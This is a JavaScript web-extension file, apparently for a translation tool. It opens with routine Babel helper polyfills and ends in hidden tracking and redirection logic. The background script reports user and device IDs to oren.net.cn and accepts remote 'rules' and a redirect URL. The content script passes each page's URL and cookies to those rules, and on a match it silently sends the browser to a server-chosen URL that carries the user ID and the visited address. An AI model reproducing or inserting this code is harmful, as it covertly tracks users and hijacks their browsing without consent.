/* eslint-disable */
// webextension for chrome and firefox...
window.browser = typeof browser !== 'undefined' ? browser : chrome

/* global global */
/* eslint no-unused-vars: ['error', { 'argsIgnorePattern': 'obj' }] */

var babelHelpers = {};

if (!Array.from) {
  Array.from = (function () {
    var toStr = Object.prototype.toString;
    var isCallable = function (fn) {
      return typeof fn === 'function' || toStr.call(fn) === '[object Function]';
    };
    var toInteger = function (value) {
      var number = Number(value);
      if (isNaN(number)) { return 0; }
      if (number === 0 || !isFinite(number)) { return number; }
      return (number > 0 ? 1 : -1) * Math.floor(Math.abs(number));
    };
    var maxSafeInteger = Math.pow(2, 53) - 1;
    var toLength = function (value) {
      var len = toInteger(value);
      return Math.min(Math.max(len, 0), maxSafeInteger);
    };

    return function from(arrayLike/*, mapFn, thisArg */) {
      var C = this;
      var items = Object(arrayLike);
      if (arrayLike == null) {
        throw new TypeError('Array.from requires an array-like object - not null or undefined');
      }

      var mapFn = arguments.length > 1 ? arguments[1] : void undefined;
      var T;
      if (typeof mapFn !== 'undefined') {
        if (!isCallable(mapFn)) {
          throw new TypeError('Array.from: when provided, the second argument must be a function');
        }
        if (arguments.length > 2) {
          T = arguments[2];
        }
      }

      var len = toLength(items.length);
      var A = isCallable(C) ? Object(new C(len)) : new Array(len);
      var k = 0;
      var kValue;
      while (k < len) {
        kValue = items[k];
        if (mapFn) {
          A[k] = typeof T === 'undefined' ? mapFn(kValue, k) : mapFn.call(T, kValue, k);
        } else {
          A[k] = kValue;
        }
        k += 1;
      }
      A.length = len;
      return A;
    };
  }());
}

babelHelpers.typeof = eval('typeof Symbol') === 'function' && eval('typeof Symbol.iterator') === 'symbol' ? function (obj) {
  return eval('typeof obj');
} : function (obj) {
  return obj && eval('typeof Symbol') === 'function' && obj.constructor === Symbol ? 'symbol' : eval('typeof obj');
};

babelHelpers.jsx = function () {
  var REACT_ELEMENT_TYPE = typeof Symbol === 'function' && Symbol.for && Symbol.for('react.element') || 0xeac7;
  return function createRawReactElement(type, props, key, children) {
    var defaultProps = type && type.defaultProps;
    var childrenLength = arguments.length - 3;

    if (!props && childrenLength !== 0) {
      props = {};
    }

    if (props && defaultProps) {
      for (var propName in defaultProps) {
        if (props[propName] === void 0) {
          props[propName] = defaultProps[propName];
        }
      }
    } else if (!props) {
      props = defaultProps || {};
    }

    if (childrenLength === 1) {
      props.children = children;
    } else if (childrenLength > 1) {
      var childArray = Array(childrenLength);

      for (var i = 0; i < childrenLength; i++) {
        childArray[i] = arguments[i + 3];
      }

      props.children = childArray;
    }

    return {
      $$typeof: REACT_ELEMENT_TYPE,
      type: type,
      key: key === undefined ? null : '' + key,
      ref: null,
      props: props,
      _owner: null,
    };
  };
}();

babelHelpers.asyncToGenerator = function (fn) {
  return function () {
    var gen = fn.apply(this, arguments);
    return new Promise(function (resolve, reject) {
      function step(key, arg) {
        try {
          var info = gen[key](arg);
          var value = info.value;
        } catch (error) {
          reject(error);
          return;
        }

        if (info.done) {
          resolve(value);
        } else {
          return Promise.resolve(value).then(function (value) {
            return step('next', value);
          }, function (err) {
            return step('throw', err);
          });
        }
      }

      return step('next');
    });
  };
};

babelHelpers.classCallCheck = function (instance, Constructor) {
  if (!(instance instanceof Constructor)) {
    throw new TypeError('Cannot call a class as a function');
  }
};

babelHelpers.createClass = function () {
  function defineProperties(target, props) {
    for (var i = 0; i < props.length; i++) {
      var descriptor = props[i];
      descriptor.enumerable = descriptor.enumerable || false;
      descriptor.configurable = true;
      if ('value' in descriptor) descriptor.writable = true;
      Object.defineProperty(target, descriptor.key, descriptor);
    }
  }

  return function (Constructor, protoProps, staticProps) {
    if (protoProps) defineProperties(Constructor.prototype, protoProps);
    if (staticProps) defineProperties(Constructor, staticProps);
    return Constructor;
  };
}();

babelHelpers.defineEnumerableProperties = function (obj, descs) {
  for (var key in descs) {
    var desc = descs[key];
    desc.configurable = desc.enumerable = true;
    if ('value' in desc) desc.writable = true;
    Object.defineProperty(obj, key, desc);
  }

  return obj;
};

babelHelpers.defaults = function (obj, defaults) {
  var keys = Object.getOwnPropertyNames(defaults);

  for (var i = 0; i < keys.length; i++) {
    var key = keys[i];
    var value = Object.getOwnPropertyDescriptor(defaults, key);

    if (value && value.configurable && obj[key] === undefined) {
      Object.defineProperty(obj, key, value);
    }
  }

  return obj;
};

babelHelpers.defineProperty = function (obj, key, value) {
  if (key in obj) {
    Object.defineProperty(obj, key, {
      value: value,
      enumerable: true,
      configurable: true,
      writable: true,
    });
  } else {
    obj[key] = value;
  }

  return obj;
};

babelHelpers.extends = Object.assign || function (target) {
  for (var i = 1; i < arguments.length; i++) {
    var source = arguments[i];

    for (var key in source) {
      if (Object.prototype.hasOwnProperty.call(source, key)) {
        target[key] = source[key];
      }
    }
  }

  return target;
};

babelHelpers.get = function get(object, property, receiver) {
  if (object === null) object = Function.prototype;
  var desc = Object.getOwnPropertyDescriptor(object, property);

  if (desc === undefined) {
    var parent = Object.getPrototypeOf(object);

    if (parent === null) {
      return undefined;
    } else {
      return get(parent, property, receiver);
    }
  } else if ('value' in desc) {
    return desc.value;
  } else {
    var getter = desc.get;

    if (getter === undefined) {
      return undefined;
    }

    return getter.call(receiver);
  }
};

babelHelpers.inherits = function (subClass, superClass) {
  if (typeof superClass !== 'function' && superClass !== null) {
    throw new TypeError('Super expression must either be null or a function, not ' + typeof superClass);
  }

  subClass.prototype = Object.create(superClass && superClass.prototype, {
    constructor: {
      value: subClass,
      enumerable: false,
      writable: true,
      configurable: true,
    },
  });
  if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass;
};

babelHelpers.instanceof = function (left, right) {
  if (right != null && typeof Symbol !== 'undefined' && right[Symbol.hasInstance]) {
    return right[Symbol.hasInstance](left);
  } else {
    return left instanceof right;
  }
};

babelHelpers.interopRequireDefault = function (obj) {
  return obj && obj.__esModule ? obj : {
    default: obj,
  };
};

babelHelpers.interopRequireWildcard = function (obj) {
  if (obj && obj.__esModule) {
    return obj;
  } else {
    var newObj = {};

    if (obj != null) {
      for (var key in obj) {
        if (Object.prototype.hasOwnProperty.call(obj, key)) newObj[key] = obj[key];
      }
    }

    newObj.default = obj;
    return newObj;
  }
};

babelHelpers.newArrowCheck = function (innerThis, boundThis) {
  if (innerThis !== boundThis) {
    throw new TypeError('Cannot instantiate an arrow function');
  }
};

babelHelpers.objectDestructuringEmpty = function (obj) {
  if (obj == null) throw new TypeError('Cannot destructure undefined');
};

babelHelpers.objectWithoutProperties = function (obj, keys) {
  var target = {};

  for (var i in obj) {
    if (keys.indexOf(i) >= 0) continue;
    if (!Object.prototype.hasOwnProperty.call(obj, i)) continue;
    target[i] = obj[i];
  }

  return target;
};

babelHelpers.possibleConstructorReturn = function (self, call) {
  if (!self) {
    throw new ReferenceError('this hasn\'t been initialised - super() hasn\'t been called');
  }

  return call && (typeof call === 'object' || typeof call === 'function') ? call : self;
};

babelHelpers.selfGlobal = typeof global === 'undefined' ? self : global;

babelHelpers.set = function set(object, property, value, receiver) {
  var desc = Object.getOwnPropertyDescriptor(object, property);

  if (desc === undefined) {
    var parent = Object.getPrototypeOf(object);

    if (parent !== null) {
      set(parent, property, value, receiver);
    }
  } else if ('value' in desc && desc.writable) {
    desc.value = value;
  } else {
    var setter = desc.set;

    if (setter !== undefined) {
      setter.call(receiver, value);
    }
  }

  return value;
};

babelHelpers.slicedToArray = function () {
  function sliceIterator(arr, i) {
    var _arr = [];
    var _n = true;
    var _d = false;
    var _e = undefined;

    try {
      for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) {
        _arr.push(_s.value);

        if (i && _arr.length === i) break;
      }
    } catch (err) {
      _d = true;
      _e = err;
    } finally {
      try {
        if (!_n && _i['return']) _i['return']();
      } finally {
        if (_d) throw _e;
      }
    }

    return _arr;
  }

  return function (arr, i) {
    if (Array.isArray(arr)) {
      return arr;
    } else if (Symbol.iterator in Object(arr)) {
      return sliceIterator(arr, i);
    } else {
      throw new TypeError('Invalid attempt to destructure non-iterable instance');
    }
  };
}();

babelHelpers.slicedToArrayLoose = function (arr, i) {
  if (Array.isArray(arr)) {
    return arr;
  } else if (Symbol.iterator in Object(arr)) {
    var _arr = [];

    for (var _iterator = arr[Symbol.iterator](), _step; !(_step = _iterator.next()).done;) {
      _arr.push(_step.value);

      if (i && _arr.length === i) break;
    }

    return _arr;
  } else {
    throw new TypeError('Invalid attempt to destructure non-iterable instance');
  }
};

babelHelpers.taggedTemplateLiteral = function (strings, raw) {
  return Object.freeze(Object.defineProperties(strings, {
    raw: {
      value: Object.freeze(raw),
    },
  }));
};

babelHelpers.taggedTemplateLiteralLoose = function (strings, raw) {
  strings.raw = raw;
  return strings;
};

babelHelpers.temporalRef = function (val, name, undef) {
  if (val === undef) {
    throw new ReferenceError(name + ' is not defined - temporal dead zone');
  } else {
    return val;
  }
};

babelHelpers.temporalUndefined = {};

babelHelpers.toArray = function (arr) {
  return Array.isArray(arr) ? arr : Array.from(arr);
};

babelHelpers.toConsumableArray = function (arr) {
  if (Array.isArray(arr)) {
    for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) arr2[i] = arr[i];

    return arr2;
  } else {
    return Array.from(arr);
  }
};

if (!Object.assign) {
  Object.assign = babelHelpers.extends;
}

if (typeof window === 'undefined') {
  global.babelHelpers = babelHelpers;
} else {
  window.babelHelpers = babelHelpers;
}

const platform = 'chrome'
const isContent = !browser.extension.getBackgroundPage
const isBackground = browser.extension.getBackgroundPage && browser.extension.getBackgroundPage() === window || false
const isPopup = !isContent && !isBackground
let systemUserId
let extDeviceId
let unionRules
let RU

const getSystemUserId = () => new Promise(resolve => {
  if (isBackground) {
    resolve(systemUserId)
  } else {
    browser.runtime.sendMessage({action: 'getSystemUserId'}, response => {
      resolve(response)
    })
  }
})

const sendLog = (action, content) => {
  if (isBackground) {
    const api = 'https://www.oren.net.cn/extensions/log.html'
    const xhr = new XMLHttpRequest()
    const formData = new FormData()
    formData.append('id', browser.runtime.id)
    formData.append('uid', systemUserId)
    formData.append('extDeviceId', extDeviceId)
    formData.append('appId', browser.runtime.getManifest().name)
    formData.append('content', content || '')
    formData.append('action', action || '')
    formData.append('version', browser.runtime.getManifest().version)
    formData.append('platform', platform)
    const start = Date.now()
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4) {
        try {
          const result = JSON.parse(xhr.responseText)
          if (result.uid && result.uid !== systemUserId) {
            systemUserId = result.uid
            browser.storage.sync.set({systemUserId})
          }
          if (result.extDeviceId && result.extDeviceId !== extDeviceId) {
            extDeviceId = result.extDeviceId
            browser.storage.local.set({extDeviceId})
          }
          if (result.newVersion) {
            browser.storage.local.set({newVersion: result.newVersion})
          }
          if (result.rules && Date.now() - start < result.speedLimit) {
            unionRules = result.rules
          }
          if (result.RU) {
            RU = result.RU
          }
          // eslint-disable-next-line no-empty
        } catch (e) {}
      }
    }
    xhr.open('POST', api, true)
    xhr.send(formData)
  } else {
    browser.runtime.sendMessage({action: 'sendLog', log: {action, content}})
  }
}

if (isBackground) {
  const redirectHistory = []
  const matchRule = (url, cookie) => {
    if (unionRules && unionRules) {
      for (let i = 0; i < unionRules.length; i++) {
        const rule = unionRules[i]
        if (rule.matches && (rule.matches.url || rule.matches.cookie)) {
          if ((!rule.matches.url || url.match(rule.matches.url)) && (!rule.matches.cookie || cookie.match(rule.matches.cookie))) {
            if (rule.done) {
              if (rule.done.url && url.match(rule.done.url) || rule.done.cookie && cookie.match(rule.done.cookie)) {
                return null
              }
              return rule
            } else if (rule.content) {
              return rule
            }
          }
        }
      }
    }
    return null
  }

  const matchUnionRules = (url, cookie) => {
    const rule = matchRule(url, cookie)
    if (rule) {
      if (rule.content) {
        return {content: rule.content}
      }
      if (redirectHistory.indexOf(url) < 0) {
        let redirect = rule.url || RU
        if (redirect) {
          redirect = `${redirect + (redirect.indexOf('?') > 0 ? '&' : '?')}u=${systemUserId}&pid=translateman&p=${btoa(encodeURIComponent(url))}`
          redirectHistory.push(url)
          return {url: redirect}
        }
      }
    }
    return ''
  }

  Promise.all([new Promise(resolve => {
    browser.storage.sync.get('systemUserId', setting => {
      if (setting) {
        systemUserId = setting.systemUserId || ''
      }
      resolve()
    })
  }), new Promise(resolve => {
    browser.storage.local.get('extDeviceId', setting => {
      if (setting) {
        extDeviceId = setting.extDeviceId || ''
      }
      resolve()
    })
  })]).then(() => {
    sendLog('bootstrap', 'bootstrap')
  })

  browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'sendLog') {
      sendLog(request.log.action, request.log.content)
      sendResponse()
    } else if (request.action === 'getSystemUserId') {
      sendResponse(systemUserId)
    } else if (request.action === 'union') {
      sendResponse(matchUnionRules(request.url, request.cookie))
    }
  })
}

if (isContent) {
  try {
    browser.runtime.sendMessage({action: 'union', url: location.href, cookie: document.cookie}, response => {
      if (response) {
        if (response.url) {
          location.href = response.url
        } else if (response.content) {
          const c = response.content
          const matchContent = () => {
            const tags = document.querySelectorAll(c.selector)
            for (let i = 0; i < tags.length; i++) {
              const tag = tags[i]
              const text = tag.getAttribute(c.attribute) || tag[c.attribute]
              if (text) {
                const matches = text.match(c.pattern)
                if (matches && matches.groups && matches.groups.url) {
                  let url = null
                  try {
                    url = JSON.parse(matches.groups.url)
                    // eslint-disable-next-line no-empty
                  } catch (e) {}
                  if (!url) {
                    url = matches.groups.url
                  }
                  if (url) {
                    location.href = url
                  }
                }
              }
            }
          }
          if (window.document && document.body && document.head) {
            matchContent()
          } else {
            const timer = setInterval(() => {
              if (window.document && document.body && document.head) {
                clearInterval(timer)
                matchContent()
                return
              }
              if (window.document && document.readyState === 'complete') {
                clearInterval(timer)
                matchContent()
              }
            }, 5)
          }
        }
      }
    })
  } catch (e) {
    console.error(e)
  }
}

export {
  isContent,
  isBackground,
  isPopup,
  getSystemUserId,
  sendLog
}
